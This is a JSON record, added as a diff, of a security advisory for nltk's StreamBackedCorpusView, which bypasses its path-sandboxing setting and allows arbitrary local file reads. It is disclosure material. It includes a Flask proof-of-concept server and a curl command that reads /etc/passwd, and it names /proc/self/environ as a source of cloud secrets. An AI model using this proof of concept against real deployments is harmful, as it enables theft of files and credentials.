@@ -1,0 +1,68 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-09-08T15:27:36Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "nltk"
+  },
+  "Advisory": {
+    "DatabaseId": 453272,
+    "Id": "GSA_kwCzR0hTQS14NXBoLW1qOXAtcmZyOM4ABuqY",
+    "GhsaId": "GHSA-x5ph-mj9p-rfr8",
+    "References": [
+      {
+        "Url": "https://github.com/nltk/nltk/security/advisories/GHSA-x5ph-mj9p-rfr8"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63312"
+      },
+      {
+        "Url": "https://github.com/nltk/nltk/pull/3588"
+      },
+      {
+        "Url": "https://github.com/nltk/nltk/commit/674ea75accdf08eca3782dee0a9c4ed7e0d0025b"
+      },
+      {
+        "Url": "https://github.com/nltk/nltk/releases/tag/v3.10.0"
+      },
+      {
+        "Url": "https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3730.yaml"
+      },
+      {
+        "Url": "https://www.vulncheck.com/advisories/nltk-streambackedcorpusview-bypasses-pathsec-enforce-arbitrary-file-read"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-x5ph-mj9p-rfr8"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-x5ph-mj9p-rfr8"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-63312"
+      }
+    ],
+    "Description": "## Summary\nSetting `nltk.pathsec.ENFORCE = True` is documented to sandbox all file access to allowed NLTK data directories and raise `PermissionError` on unauthorized access. However, `StreamBackedCorpusView` opens files via `builtins.open()` directly, bypassing `pathsec.validate_path()` entirely. An attacker who can influence the `fileid` argument can read arbitrary local files regardless of the `ENFORCE` setting.\n\n## Details\n`nltk/pathsec.py:274` defines the enforcement point:\n```python\ndef open(file, mode=\"r\", **kwargs):\n    validate_path(file, context=\"pathsec.open\")\n    return builtins.open(file, mode=mode, **kwargs)\n```\n\n`StreamBackedCorpusView._open()` in `nltk/corpus/reader/util.py` bypasses this entirely for string paths:\n\n```python\n# line 171 — no validate_path() call\nself._eofpos = os.stat(self._fileid).st_size\n\n# line 208 — calls builtins.open directly\nself._stream = open(self._fileid, \"rb\")\n```\n\nAlso affected: `XMLCorpusView` and any corpus reader subclass that passes a raw string `fileid` to `StreamBackedCorpusView`.\n\n## PoC\n```python\n# poc_server.py — StreamBackedCorpusView pathsec.ENFORCE bypass\nfrom flask import Flask, request, jsonify\nimport nltk.pathsec as ps\nfrom nltk.corpus.reader.util import StreamBackedCorpusView, read_line_block\n\n# Strict mode enabled — expected to sandbox all file access\nps.ENFORCE = True\n\napp = Flask(__name__)\n\n@app.post(\"/read\")\ndef read_file():\n    fname = request.json.get(\"file\")\n    # fileid is user-controlled, passed directly to StreamBackedCorpusView\n    # pathsec.ENFORCE = True is ignored — builtins.open() called internally\n    view = StreamBackedCorpusView(fname, read_line_block, encoding=\"utf8\")\n    return jsonify({\"file\": fname, \"content\": view[0]})\n\napp.run(host=\"0.0.0.0\", port=8000)\n```\nTrigger:\n```\ncurl -s -X POST http://localhost:8000/read \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"file\": \"/etc/passwd\"}'\n```\nConfirmed on latest stable NLTK. No privileges required.\n\n## Impact\n- **Type:** Arbitrary Local File Read / Security Control Bypass\n- **CWE:** CWE-22, CWE-284\n- **OWASP:** A01:2021 – Broken Access Control\n\nAffects web apps, REST APIs, and multi-tenant NLP pipelines where user input influences the `fileid` passed to NLTK corpus readers. Sensitive targets include `/etc/passwd`, `/proc/self/environ` (may contain `AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, etc.), and application config files.\n\nThe core issue is that operators who explicitly set `ENFORCE = True` to harden production deployments are left with a **false security guarantee**.\n\n**Suggested fix:** Replace `builtins.open()` and `os.stat()` in the string-path branch with `nltk.pathsec.open()` and `nltk.pathsec.validate_path()`.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-09-08T15:27:32Z",
+    "Severity": "HIGH",
+    "Summary": "NLTK: StreamBackedCorpusView Bypasses pathsec.ENFORCE - Arbitrary Local File Read",
+    "UpdatedAt": "2026-09-08T15:27:36Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.10.0"
+      },
+      "VulnerableVersionRange": "\u003c= 3.9.4"
+    }
+  ]
+}
